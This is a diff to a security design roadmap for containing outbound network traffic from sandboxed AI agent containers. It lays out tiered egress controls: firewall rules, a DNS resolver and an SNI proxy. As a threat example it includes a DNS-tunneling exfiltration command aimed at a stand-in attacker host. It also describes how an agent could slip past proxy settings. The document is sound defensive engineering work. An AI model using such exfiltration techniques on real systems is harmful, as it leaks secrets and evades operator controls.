@@ -28,23 +28,30 @@ tracker as separate issues. None implemented yet.
       repo-scoped tokens (GitHub App installation tokens, minutes-long TTL, minted
       per-turn) and/or out-of-process git (push/pull from the orchestrator host so the
       token never enters the container), with Gap 1 egress as the backstop.
-- [x] **Gap 1 — outbound egress allowlist (Phase 1, SHI-90).** Default-deny egress via an
-      orchestrator-controlled forward proxy (`egress-proxy.ts`) gating a configurable host
-      allowlist (`egress-allowlist.ts`): the agent APIs, the git host (`.github.com`),
-      package registries (npm/yarn/pypi), `SESSION_EGRESS_ALLOWLIST` extras, and live MCP
-      hosts from the credential store. Containers are pointed at it via
-      `HTTP_PROXY`/`HTTPS_PROXY` (`buildEnv`), with `NO_PROXY` bypassing the orchestrator's
-      own traffic; the proxy answers 403 for any non-allowlisted host. Wired in
-      `app-lifecycle.ts` behind `SESSION_EGRESS_PROXY=1`. Tests: `egress-allowlist.test.ts`
-      (matcher incl. look-alike rejection + dynamic MCP hosts), `egress-proxy.test.ts`
-      (CONNECT + HTTP deny-403 / allow-forward over real sockets — the exfil-fails
-      acceptance), `container-lifecycle.test.ts` (env injection).
-- [ ] **Gap 1 — network-layer default-deny (follow-up).** Pair the proxy with an `internal`
-      Docker network + NAT gateway so the proxy is the *only* egress route and a raw socket
-      can't bypass the `HTTP_PROXY` env var. Deployment-topology change; ships as a
-      documented operator requirement alongside `SESSION_EGRESS_PROXY` until done.
+- **Gap 1 — outbound egress control (SHI-90).** Full design in
+  [egress-control.md](./egress-control.md). Enforcement is a network-layer gateway
+  middlebox (the `HTTP_PROXY` env-var proxy is not a real control — a raw socket bypasses
+  it). Delivered as **one PR, sequential commits A→B→C, each independently green**:
+  - [x] Allowlist matcher (`egress-allowlist.ts`) — base + `SESSION_EGRESS_ALLOWLIST` +
+        live MCP hosts; suffix matching rejects look-alikes. Reused by Tier C. (done)
+  - [ ] **Tier A** — `internal` per-session network + gateway; iptables default-deny +
+        `ipset` floor (Anthropic `init-firewall.sh` patterns: `gh api meta` CIDR,
+        resolve-and-pin, `example.com`-must-fail self-test). NET_ADMIN lives in the
+        gateway, never the agent container.
+  - [ ] **Tier B** — controlled DNS resolver at the gateway: answers only allowlisted
+        names (closes DNS tunneling — `dig secret.attacker.com`) and drives the ipset with
+        the IPs it returns (kills stale-IP breakage). The correction over Anthropic's
+        DNS-open reference; minimum tier that contains exfil.
+  - [ ] **Tier C** — transparent SNI/CONNECT proxy (reuse the matcher) for hostname-level
+        HTTPS policy, the allow-once / add-to-allowlist inline card (deny-fast + retry,
+        persisted), and the Phase-2 hook. **Removes** the `HTTP_PROXY`/`NO_PROXY` env
+        injection currently on the branch.
+  - [ ] **Settings UI** — default-on global toggle (fail-secure, applies on container
+        restart) + per-session override + allowlist editor; browser-only routes added to
+        SHI-129 `HARD_DENIED_GLOBALS` + golden route-table updated.
 - [ ] **Gap 1 — identity-validating proxy (Phase 2)** for allowlisted multi-tenant hosts so
-      an approved API can't be used to upload into an attacker's account.
+      an approved API can't be used to upload into an attacker's account. Builds on the
+      Tier C proxy hook.
 
 ## P1
 
